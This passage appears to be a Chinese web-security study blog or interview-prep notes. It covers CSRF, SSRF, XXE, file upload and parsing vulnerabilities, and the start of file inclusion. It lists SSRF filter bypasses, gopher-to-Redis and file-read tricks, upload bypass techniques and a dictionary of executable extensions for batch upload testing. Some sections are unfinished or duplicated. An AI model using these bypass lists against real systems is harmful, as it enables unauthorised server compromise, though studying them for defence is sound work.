<li>博彩网站存在反射型的XSS，在网站首页存在在线客服的窗口，问：你该如何进行利用？</li>
</ol>
<h1>CSRF客户端请求伪造</h1>
<blockquote>
<p>CSRF（英语：Cross-site request forgery）跨站请求伪造(客户端请求伪造)，也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS利用的是<strong>用户对指定网站的信任</strong>，CSRF利用的是<strong>网站对用户网页浏览器的信任</strong>。最大的区别就是CSRF没有盗取用户的cookie,而是直接的利用了浏览器存储的cookie让用户去执行某个动作。</p>
</blockquote>
<h2 id="概念"><a class="header-anchor" href="#概念">¶</a>概念</h2>
<p>​		由于网站对用户网页浏览器的信任导致用户在当前已登录的Web站点的状态下，访问攻击者构造的攻击连接从而执行非本意的操作的漏洞</p>
<h2 id="危害（利用方式）"><a class="header-anchor" href="#危害（利用方式）">¶</a>危害（利用方式）</h2>
<ol>
<li>以受害者名义发送邮件，发消息。</li>
<li>盗取受害者的账号，甚至购买商品，虚拟货币转账。</li>
<li>修改受害者的网络配置（比如修改路由器DNS、重置路由器密码）。</li>
<li>网站后台创建管理员用户，破坏网站，获取服务器权限等。</li>
</ol>
<h2 id="条件"><a class="header-anchor" href="#条件">¶</a>条件</h2>
<p>1.用户处于登陆目标网站的状态(Cookie)<br>
2.用户点击攻击者发送的恶意URL连接</p>
<h2 id="漏洞区别"><a class="header-anchor" href="#漏洞区别">¶</a>漏洞区别</h2>
<p>XSS跨站脚本：用户的浏览器   —》 用户<br>
CSRF客户端请求伪造：目标网站下的用户   —》 用户</p>
<h2 id="防护"><a class="header-anchor" href="#防护">¶</a>防护</h2>
<p>1、验证请求头中的HTTP Referer字段<br>
2、在请求包中添加Token并验证<br>
3、在HTTP头中自定义属性并验证<br>
4、高危操作加入验证码机制<br>
5、使用HTTPonly进行防护</p>
<h1>SSRF服务端请求伪造</h1>
<h2 id="原理-v2"><a class="header-anchor" href="#原理-v2">¶</a>原理</h2>
<p>​		由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据的Web安全漏洞！</p>
<h2 id="危害"><a class="header-anchor" href="#危害">¶</a>危害</h2>
<ul>
<li>
<p>可以对外网或服务器所在内网进行端口扫描，获取一些服务的Banner信息（端口对应服务）</p>
</li>
<li>
<p>对内网 WEB 应用进行指纹识别，通过访问默认文件实现（eg:Readme文件）</p>
</li>
<li>
<p>对主机本地敏感数据的读取（eg: file:///c:/win.ini/ or hosts）</p>
</li>
<li>
<p>内外网主机应用程序漏洞的利用(FTP/Redis/EMAIL)</p>
</li>
<li>
<p>内外网Web站点漏洞的利用（gopher://Ip or Domain/_GET/POST）</p>
</li>
</ul>
<h2 id="SSRF利用协议"><a class="header-anchor" href="#SSRF利用协议">¶</a>SSRF利用协议</h2>
<ul>
<li>
<p><strong>PHP</strong>：访问各个输入/输出流(I/O streams)，可BASE64编码形式读取PHP文件。</p>
</li>
<li>
<p><strong>file</strong>：在有回显的情况下，利用 file 协议可以读取任意文件的内容。</p>
</li>
<li>
<p><strong>dict</strong>：dict协议可以用来探测开放的端口其泄露安装软件版本信息/查看端口/操作内网redis服务等。</p>
</li>
<li>
<p><strong>http/s</strong>：访问 HTTP/S网址以此来探测内网主机存活。</p>
</li>
<li>
<p><strong>gopher</strong>：通过gopher访问对应计算机上的其他资源，支持发出GET/POST请求。是SSRF利用中一个最强大的协议(俗称万能协议)。可用于反弹shell!</p>
</li>
</ul>
<h2 id="高危函数"><a class="header-anchor" href="#高危函数">¶</a>高危函数</h2>
<p><strong>cur_exec()</strong>：执行给定的curl会话…这个函数应该在初始化一个curl会话并且全部的选向都被设置后调用…</p>
<p><strong>file_get_content()</strong>：函数的作用是将整个文件读入一个字符串中，并且此函数是用于把文件的内容读入到一个字符串中的首选方法</p>
<p><strong>fsockopen()</strong>：打开一个网络连接或套接字连接</p>
<p>​	1.使用fsockopen函数实现获取用户制定url的数据（文件或者html）。</p>
<p>​	2.这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p>
<p>​	3.fsockopen本身就是打开一个网络连接或者Unix套接字连接。</p>
<h2 id="漏洞验证方式"><a class="header-anchor" href="#漏洞验证方式">¶</a>漏洞验证方式</h2>
<p>1、<strong>排除法</strong>：浏览器f12查看源代码看是否是在本地进行了请求</p>
<p>比如：该资源地址类型为 <a target="_blank" rel="noopener" href="http://www.xxx.com/a.php?image=URL,URL%E5%8F%82%E6%95%B0%E8%8B%A5%E6%98%AF%E5%85%B6%E4%BB%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9C%B0%E5%9D%80%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=URL,URL参数若是其他服务器地址就可能存在SSRF漏洞</a></p>
<p>2、<strong>dnslog等工具进行测试</strong>，看是否被访问(可以在盲打后台，用例中将当前准备请求的url和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求)</p>
<p>3、<strong>抓包分析发送的请求是不是通过服务器发送的</strong>，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在HTTP服务的内网地址</p>
<ul>
<li>从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</li>
<li>通过二级域名暴力猜解工具模糊猜测内网地址</li>
<li>通过file协议读取内网信息获取相关地址</li>
</ul>
<p>4、<strong>直接返回的Banner、title、content等信息</strong></p>
<p>5、留意布尔型SSRF，通过判断两次不同请求结果的差异来判断是否存在SSRF，类似布尔型sql盲注方法。</p>
<h2 id="漏洞利用方式"><a class="header-anchor" href="#漏洞利用方式">¶</a>漏洞利用方式</h2>
<p>能扫描内部网络，获取端口，服务信息。</p>
<p>攻击运行在内网或本地的应用程序。</p>
<p>对内网web进行指纹识别。</p>
<p>对内部主机和端口发送请求包进行攻击。</p>
<p>file协议读取本地文件。</p>
<h2 id="SSRF漏洞挖掘点"><a class="header-anchor" href="#SSRF漏洞挖掘点">¶</a>SSRF漏洞挖掘点</h2>
<p>社交分享功能：获取超链接的标题等内容进行显示</p>
<p>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>
<p>在线翻译：给网址翻译对应网页的内容</p>
<p>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p>
<p>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p>
<p>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p>
<p>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p>
<p>数据库内置功能：数据库的比如mongodb的copyDatabase函数</p>
<p>邮件系统：比如接收邮件服务器地址</p>
<p>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p>
<p>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p>
<p>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p>
<h2 id="SSRF绕过"><a class="header-anchor" href="#SSRF绕过">¶</a>SSRF绕过</h2>
<p>待补充……</p>
<h2 id="漏洞防御"><a class="header-anchor" href="#漏洞防御">¶</a>漏洞防御</h2>
<ol>
<li>禁止跳转；</li>
<li>限制请求的端口为 http 常用的端口，比如 80、443、8080、8090；</li>
<li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态；</li>
<li>设置 URL 白名单或者限制内网 IP（使用 gethostbyname()判断是否为内网 IP）；</li>
<li>禁用不需要的协议，仅仅允许 http 和 https 请求。可以防止类似于 file://, gopher://, ftp:// 等引 起的问题；</li>
<li>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果 web 应用是去获取某一种类型的 文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准；</li>
</ol>
<h2 id="问题-v5"><a class="header-anchor" href="#问题-v5">¶</a>问题</h2>
<p><strong>1.XSS/CSRF/SSRF之间的区别？</strong></p>
<p><strong>2.造成SSRF漏洞的高危函数是？</strong></p>
<p>curl_exec()</p>
<p>file_get_contents</p>
<p>fsackopen</p>
<p><strong>3.SSRF打内网Redis思路及手法？</strong></p>
<p>通过 SSRF 的 gopher 协议操作内⽹的 redis</p>
<p><strong>4.SSRF绕过与防御手法？</strong></p>
<p>＠ 绕过</p>
<p>[::]或者localhost或者0.0.0.0　　绕过</p>
<p>添加端⼝号绕过</p>
<p>特殊域名ｄｎｓ解析</p>
<p>进制转换</p>
<p>句号</p>
<p>302短链接跳转</p>
<p><strong>如何判断是ssrf还是url跳转漏洞？</strong></p>
<p>dnslog判断ip是否是本机ip</p>
<h1>XML外部实体注入</h1>
<h2 id="原理-v3"><a class="header-anchor" href="#原理-v3">¶</a>原理</h2>
<p>​		 XML外部实体注入（XML Extenrnal Entity Injection），简称XXE漏洞。引发XXE漏洞的主要原因是<strong>XML解析依赖库libxml默认开启了对外部实体的引用，导致服务端在解析用户提交的XML信息时未作处理直接进行解析，导致加载恶意的外部文件和代码，造成任意文件读取，命令执行、内网扫描等危害。</strong></p>
<h2 id="利用条件"><a class="header-anchor" href="#利用条件">¶</a><strong>利用条件</strong></h2>
<ul>
<li><strong>libxml&lt;2.9 默认开启</strong></li>
</ul>
<h2 id="基础知识-v2"><a class="header-anchor" href="#基础知识-v2">¶</a>基础知识</h2>
<p>XML文档结构包括<code>XML声明</code>，<code>DTD(文档类型定义)</code>,<code>文档元素</code>三部分构成！</p>
<p>XML是可扩展标记语言（Extensible Markup Language）,是设计用来进行数据的传输与存储。</p>
<p><strong>XML特性</strong></p>
<ul>
<li>XML 指可扩展标记语言（EXtensible Markup Language）</li>
<li>XML 是一种标记语言，很类似 HTML</li>
<li>XML 的设计宗旨是传输数据，而非显示数据</li>
<li>XML 标签没有被预定义。您需要自行定义标签</li>
<li>XML 被设计为具有自我描述性。</li>
<li>XML 是 W3C 的推荐标准</li>
<li>XML 是不作为的</li>
<li>XML 仅仅是纯文本</li>
<li>XML 可以发明自己的标签</li>
<li>XML 是对 HTML 的补充</li>
</ul>
<blockquote>
<p>DTD，即<code>Document Type Definition</code>，文档类型定义的简称，是一种精确描述XML语言的方式。DTD根据XML语言的语法规则检查XML文档结构的词汇和有效性。DTD主要用于保证XML文档格式正确，我们可以通过比较XML文档和DTD文件来看文档是否合乎规范，元素和标签使用是否正确。</p>
<p>备注：我们可以在XML文档中指定DTD，即<code>内部DTD</code>。也可以将DTD保存在单独的以.dtd扩展名的文档中，然后单独添加，这样即<code>外部DTD</code>。</p>
</blockquote>
<h3 id="内部DTD"><a class="header-anchor" href="#内部DTD">¶</a>内部DTD</h3>
<h3 id="外部DTD"><a class="header-anchor" href="#外部DTD">¶</a>外部DTD</h3>
<h3 id="实体"><a class="header-anchor" href="#实体">¶</a>实体</h3>
<p>实体是对数据的引用,通常使用<code>&lt;!ENTITY&gt;</code>标签定义；根据实体种类的不同，XML 解析器将使用实体的替代文本或者外部文档的内容来替代实体引用，它主要分为以下四类：</p>
<ul>
<li>内置实体 (Built-in entities)</li>
<li>字符实体 (Character entities)</li>
<li>通用实体 (General entities)</li>
<li>参数实体 (Parameter entities)</li>
</ul>
<p>》》》实体类型-按类型《《《</p>
<p>实体又分为通用实体和参数实体。</p>
<ol>
<li>通用实体</li>
</ol>
<ul>
<li>用 &amp;实体名;引用，在DTD 中定义（内外DTD都行），在 XML文档元素中引用。</li>
</ul>
<ol>
<li>参数实体</li>
</ol>
<ul>
<li>使用 % 实体名;(中间有空格) 在DTD中定义（内外DTD都行），并且只能在DTD中使用 %实体名; 引用。</li>
<li>在 DTD 文件中，参数实体的声明可以引用其他实体（参数实体和通用实体）。</li>
</ul>
<p>》》》实体类型-按位置《《《</p>
<p>根据实体位置定义位置的不同分为<code>内部实体</code>和<code>外部实体</code>，其中：</p>
<p>内部实体：在DTD中声明实体，则称为内部实体。</p>
<p>外部实体：如果在DTD之外声明实体，则称为外部实体。</p>
<h3 id="漏洞挖掘"><a class="header-anchor" href="#漏洞挖掘">¶</a>漏洞挖掘</h3>
<p><strong>手工挖掘</strong></p>
<ul>
<li>关注提交数据的类型。如果是XML格式的，就可以进行测试。</li>
<li>关注数据包的<strong>Content-Type</strong>值。如果是<strong>text/xml</strong>或者是<strong>application/xml</strong>，就可以关注该数据包。还可以尝试更改<code>Content-Type</code>值，例如原来的Content-type是json，发送的也是json格式的数据，我们将Content-Type类型改为XML，数据也改为XML后，尝试是否可以成功。</li>
</ul>
<h3 id="漏洞修复"><a class="header-anchor" href="#漏洞修复">¶</a>漏洞修复</h3>
<p><strong>方式一：使用开发语言提供的禁用外部实体的方法</strong></p>
<ul>
<li>PHP</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">libxml_disable_entity_loader(true);<br></code></pre></td></tr></table></figure>
<ul>
<li>Java</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(false);<br></code></pre></td></tr></table></figure>
<ul>
<li>Python</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))<br></code></pre></td></tr></table></figure>
<p><strong>方式二：过滤用户输入</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">过滤用户提交的XML数据 ，关键词：<span class="hljs-meta">&lt;!DOCTYPE&gt;</span>、<span class="hljs-meta">&lt;!ENTITY&gt;</span>、SYSTEM、PUBLIC<br></code></pre></td></tr></table></figure>
<h3 id="实例"><a class="header-anchor" href="#实例">¶</a>实例</h3>
<p><strong>CVE-2017-12629 XXE 漏洞</strong></p>
<p>fofa：app=“APACHE-Solr”</p>
<p>待补充………………</p>
<h1>文件上传漏洞</h1>
<h2 id="原理-v4"><a class="header-anchor" href="#原理-v4">¶</a>原理</h2>
<p>文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上传可执行的动态脚本文件。如常见的头像上传，图片上传，oa 办公文件上传，媒体上传，允许用户上传文件，如果过滤不严格，恶意用户利用文件上传漏洞，上传有害的可以执行脚本文件到服务器中， 可以获取服务器的权限，或进一步危害服务器。</p>
<h2 id="危害-v2"><a class="header-anchor" href="#危害-v2">¶</a>危害</h2>
<p>非法用户可以上传的恶意文件控制整个网站，甚至是控制服务器，这个恶意脚本文件，又被称为 webshell， 上传 webshell 后门很方便地查看服务器信息，查看目录，执行系统命令等。</p>
<h2 id="文件上传代码"><a class="header-anchor" href="#文件上传代码">¶</a>文件上传代码</h2>
<p>文件上传时会返回一些代码 返回客户端 客户端根据这些值判断上传是否正常</p>
<ul>
<li>
<p>值：0; 没有错误发生，文件上传成功。</p>
</li>
<li>
<p>值：1; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。</p>
</li>
<li>
<p>值：2; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。</p>
</li>
<li>
<p>值：3; 文件只有部分被上传。</p>
</li>
<li>
<p>值：4; 没有文件被上传。</p>
</li>
</ul>
<h2 id="文件上传漏洞原因"><a class="header-anchor" href="#文件上传漏洞原因">¶</a>文件上传漏洞原因</h2>
<p>文件上传漏洞分为：</p>
<p><strong>直接文件上传(任意文件上传)</strong>，这种漏洞类型是属于高危漏洞的一种，能直接 getshell，而且没有任 何限制，攻击者很容易通过上传点，获取网站的控制权限；</p>
<p>另外一种是有条件的上传漏洞，这种漏洞一般 是开发者经验不足，对文件上传做了简单的限制，如简单的前端认证，文件头文件检测，这种检测行为， 可以完全绕过的；</p>
<p>另外一个方面就是权限认证没处理，没有对文件上传页面进行权限认证，匿名者就能访问上传文件，上传网页后门到网站目录，控制整个网站；</p>
<p>还有一些上传逻辑有问题，导致文件上传可以被绕过，上传后门到网站上。有的文件上传漏洞则是通过中间件或者系统特性上传可以被服务器解析脚本文件，从而导致网站可被控制；</p>
<h3 id="修复"><a class="header-anchor" href="#修复">¶</a>修复</h3>
<ul>
<li>在网站中需要存在上传模块，需要做好权限认证，不能让匿名用户可访问；</li>
<li>文件上传目录设置为禁止脚本文件执行。这样设置即使被上传后门的动态脚本也不能解析，导致攻击 者放弃这个攻击途径；</li>
<li>设置上传白名单，白名单只允许图片上传如，jpg png gif 其他文件均不允许上传；</li>
<li>上传的后缀名，一定要设置成图片格式如 jpg png gif ；</li>
</ul>
<h3 id="攻击思路"><a class="header-anchor" href="#攻击思路">¶</a>攻击思路</h3>
<p>​		寻找测试网站的文件上传的模块，常见：头像上传，修改上传，文件编辑器中文件上传，图片上传、媒体上传等，通过抓包上传恶意的文件进行测试，上传后缀名 asp php aspx 等的动态语言脚本，查看上传时的返回信息，判断是否能直接上传，如果不能直接上传，再进行测试上传突破，例如上传文件的时候只允许图片格式的后缀，但是修改文件时，却没有限制后缀名，图片文件可以修改成动态语言格式如 php，则可能访问这个文件的 URL 直接 getshell，可以控制网站。</p>
<h3 id="常见的网站文件后缀名"><a class="header-anchor" href="#常见的网站文件后缀名">¶</a>常见的网站文件后缀名</h3>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">可执行脚本的文件后缀名，可被网站目录解析。以下是常见的后缀名：<br>  ○ asp <br>  ○ asa <br>  ○ cdx <br>  ○ cer <br>  ○ php <br>  ○ aspx <br>  ○ ashx <br>  ○ <span class="hljs-keyword">jsp </span><br>  ○ php3 <br>  ○ php.a <br>  ○ <span class="hljs-keyword">shtml </span><br>  ○ phtml <br>有些网站会对 asp 或者 php 进行过滤转成空可用这些后缀名：<br>  ○ aspasp <br>  ○ asaspp <br>  ○ phpphp  <br></code></pre></td></tr></table></figure>
<h3 id="文件上传绕过技术"><a class="header-anchor" href="#文件上传绕过技术">¶</a>文件上传绕过技术</h3>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs llvm">绕过前端 js 检测上传<br>绕过 contnet-<span class="hljs-keyword">type</span> 检测上传<br>绕过黑名单上传<br>htaccess 重写解析绕过上传<br>大小写绕过上传<br>空格绕过上传攻击<br>利用 windows 系统特征绕过上传<br>NTFS 交换数据流::$DATA 绕过上传<br>利用 windows 环境的叠加特征绕过上传<br>双写后缀名绕过上传<br>目录可控<span class="hljs-variable">%00</span> 截断绕过上传（GET）<br>目录可控<span class="hljs-variable">%00</span> 截断绕过上传（POST）<br>文件头检测绕过上传<br>绕过图片二次渲染上传<br>文件上传条件竞争漏洞绕过<br>文件名可控绕过上传<br>数组绕过上传<br></code></pre></td></tr></table></figure>
<p>待细节补充………………</p>
<h3 id="文件上传漏洞通用检测方法"><a class="header-anchor" href="#文件上传漏洞通用检测方法">¶</a>文件上传漏洞通用检测方法</h3>
<p>​		判断是否为黑白名单，如果是白名单，寻找可控参数。如果是黑名单禁止上传， 可以用有危害的后缀名批量提交测试，寻找遗留的执行脚本.</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-title">.php</span><br><span class="hljs-title">.php5</span><br><span class="hljs-title">.php4</span><br><span class="hljs-title">.php3</span><br><span class="hljs-title">.php2</span><br><span class="hljs-title">.html</span><br><span class="hljs-title">.htm</span><br><span class="hljs-title">.phtml</span><br><span class="hljs-title">.pht</span><br><span class="hljs-title">.pHp</span><br><span class="hljs-title">.phP</span><br><span class="hljs-title">.pHp5</span><br><span class="hljs-title">.pHp4</span><br><span class="hljs-title">.pHp3</span><br><span class="hljs-title">.pHp2</span><br><span class="hljs-title">.Html</span><br><span class="hljs-title">.Htm</span><br><span class="hljs-title">.pHtml</span><br><span class="hljs-title">.jsp</span><br><span class="hljs-title">.jspa</span><br><span class="hljs-title">.jspx</span><br><span class="hljs-title">.jsw</span><br><span class="hljs-title">.jsv</span><br><span class="hljs-title">.jspf</span><br><span class="hljs-title">.jtml</span><br><span class="hljs-title">.jSp</span><br><span class="hljs-title">.jSpx</span><br><span class="hljs-title">.jSpa</span><br><span class="hljs-title">.jSw</span><br><span class="hljs-title">.jSv</span><br><span class="hljs-title">.jSpf</span><br><span class="hljs-title">.jHtml</span><br><span class="hljs-title">.asp</span><br><span class="hljs-title">.aspx</span><br><span class="hljs-title">.asa</span><br><span class="hljs-title">.asax</span><br><span class="hljs-title">.ascx</span><br><span class="hljs-title">.ashx</span><br><span class="hljs-title">.asmx</span><br><span class="hljs-title">.cer</span><br><span class="hljs-title">.aSp</span><br><span class="hljs-title">.aSpx</span><br><span class="hljs-title">.aSa</span><br><span class="hljs-title">.aSax</span><br><span class="hljs-title">.aScx</span><br><span class="hljs-title">.aShx</span><br><span class="hljs-title">.aSmx</span><br><span class="hljs-title">.cEr</span><br><span class="hljs-title">.sWf</span><br><span class="hljs-title">.swf</span><br><span class="hljs-title">.htaccess</span><br></code></pre></td></tr></table></figure>
<ul>
<li>使用 burpsuite 抓包上传将后缀名设置成变量，把这些文件设置成一个字典批量提交；</li>
</ul>
<h3 id="文件上传的防御方法"><a class="header-anchor" href="#文件上传的防御方法">¶</a>文件上传的防御方法</h3>
<ul>
<li>服务器端使用白名单防御；</li>
<li>修复 web 中间件的漏洞；</li>
<li>禁止客户端存在可控参数；</li>
<li>存放文件目录禁止脚本执行；</li>
<li>限制后缀名；</li>
<li>一定要设置图片格式 jpg、gif 、 png 文件名随机的，不可预测；</li>
</ul>
<h1>文件解析漏洞</h1>
<img src="/posts/d62edc36/1677139760844-ffc9672c-3e1f-464b-9fe7-6d6b2d6b47fd.png" class title="img">
<h2 id="原理-v5"><a class="header-anchor" href="#原理-v5">¶</a>原理</h2>
<p>​		文件解析漏洞是由于中间件错误的将任意格式的文件解析成网页可执行文件，配合文件上传漏洞进行GetShell的漏洞！</p>
<h2 id="IIS解析漏洞"><a class="header-anchor" href="#IIS解析漏洞">¶</a>IIS解析漏洞</h2>
<h3 id="IIS6-X"><a class="header-anchor" href="#IIS6-X">¶</a>IIS6.X</h3>
<p><strong>方式一：目录解析</strong></p>
<p>在网站下建立文件夹的名字为 <code>.asp/.asa </code>的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。</p>
<p><strong>方式二：畸形文件解析</strong></p>
<p>在IIS 6 处理文件解析时，分号可以起到截断的效果。也就是说 shell.asp;.jpg会被服务器看成是shell.asp。另外IIS6.0默认的可执行文件除了asp还包含<code>asa\cer\cdx</code></p>
<h3 id="IIS7-X"><a class="header-anchor" href="#IIS7-X">¶</a>IIS7.X</h3>
<blockquote>
<p>在IIS7.0和IIS7.5版本下也存在解析漏洞，在默认Fast-CGI开启状况下，在一个文件路径/xx.jpg后面加上/xx.php会将 <code>**/xx.jpg/xx.php**</code> <em><strong>解析为 php 文件</strong></em>。</p>
</blockquote>
<p><strong>利用条件</strong></p>
<ol>
<li>
<p>php.ini里的cgi.fix_pathinfo=1 开启</p>
</li>
<li>
<p>IIS7在Fast-CGI运行模式下</p>
</li>
</ol>
<h3 id="修复方式"><a class="header-anchor" href="#修复方式">¶</a>修复方式</h3>
<p><strong>程序方面</strong></p>
<p>1、对新建目录文件名进行过滤，不允许新建包含.的文件夹。 <br>
2、取消网站后台新建目录的功能,不允许新建目录。</p>
<p><strong>服务器方面</strong></p>
<p>1、限制上传目录的脚本执行权限，不允许执行脚本。 <br>
2、过滤.asp/xm.jpg,通过ISApi组件过滤。 在httpd.ini加入了以下规则 ASP RewriteRule (.<em>).asp/(.</em>) /no.gif RewriteRule (.<em>).Asp/(.</em>) /no.gif RewriteRule (.<em>).aSp/(.</em>) /no.gif RewriteRule (.<em>).asP/(.</em>) /no.gif</p>
<h2 id="Nginx解析漏洞"><a class="header-anchor" href="#Nginx解析漏洞">¶</a>Nginx解析漏洞</h2>
<h4 id="nginx-parsing"><a class="header-anchor" href="#nginx-parsing">¶</a>nginx_parsing</h4>
<p>这个解析漏洞其实是PHP CGI的漏洞，在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析。在一个文件/xx.jpg后面加上/.php会将 <code>/xx.jpg/xx.php </code>解析为 php 文件。</p>
<p><strong>》》》利用条件《《《</strong></p>
<ul>
<li>Nginx &lt;=0.8.37</li>
<li>cgi.fix_pathinfo=1</li>
</ul>
<p><strong>》》》利用姿势《《《</strong></p>
<p>Nginx的文件解析漏洞…和IIS7.0的解析漏洞同样的原理,因为<code>cgi.fix_pathinfo=1</code>造成的解析漏洞…</p>
<p>PS：同样使用<code>1.jpg/.php</code>方式进行绕过…</p>
<h4 id="CVE-2017-15715"><a class="header-anchor" href="#CVE-2017-15715">¶</a>CVE-2017-15715</h4>
<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<p><strong>》》》影响版本《《《</strong></p>
<ul>
<li>2.4.0~2.4.29</li>
</ul>
<h2 id="Apache解析漏洞"><a class="header-anchor" href="#Apache解析漏洞">¶</a>Apache解析漏洞</h2>
<h4 id="apache-parsing"><a class="header-anchor" href="#apache-parsing">¶</a>apache_parsing</h4>
<p>在Apache1.x/2.x中Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。如<code>1.php.xxxxx</code></p>
<p><strong>》》》漏洞原理《《《</strong></p>
<p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如如下配置文件：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">AddType text/html .html<br>AddLanguage zh-CN .cn<br></code></pre></td></tr></table></figure>
<p>其给<code>.html</code>后缀增加了<code>media-type</code>，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，如果用户请求文件<code>index.cn.html</code>，他将返回一个中文的html页面。以上就是Apache多后缀的特性。如果运维人员给<code>.php</code>后缀增加了处理器：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">AddHandler application/x-httpd-php .php<br></code></pre></td></tr></table></figure>
<p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
<h4 id="CVE-2017-15715-v2"><a class="header-anchor" href="#CVE-2017-15715-v2">¶</a>CVE-2017-15715</h4>
<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<p><strong>》》》影响版本《《《</strong></p>
<ul>
<li>2.4.0~2.4.29</li>
</ul>
<h1>文件包含漏洞</h1>
<blockquote>
<p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。 程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞；</p>
